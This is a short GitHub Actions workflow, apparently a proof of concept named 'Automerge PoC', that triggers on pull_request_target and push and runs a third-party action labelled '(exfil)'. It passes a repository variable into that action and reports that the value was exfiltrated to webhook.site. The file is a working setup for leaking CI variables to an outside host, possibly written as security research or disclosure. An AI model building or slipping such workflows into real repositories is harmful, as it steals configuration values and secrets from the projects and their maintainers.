name: Automerge PoC

on:
  pull_request_target:
    types: [opened, synchronize, reopened]
  push:
    branches:
      - main

jobs:
  demo:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run demo action (exfil)
        uses: yakosolana/demo-action@v1
        env:
          DUMMY: ${{ vars.MARINADE_VAR }}
      - run: echo "Job finished – check webhook.site for the exfiltrated variable"
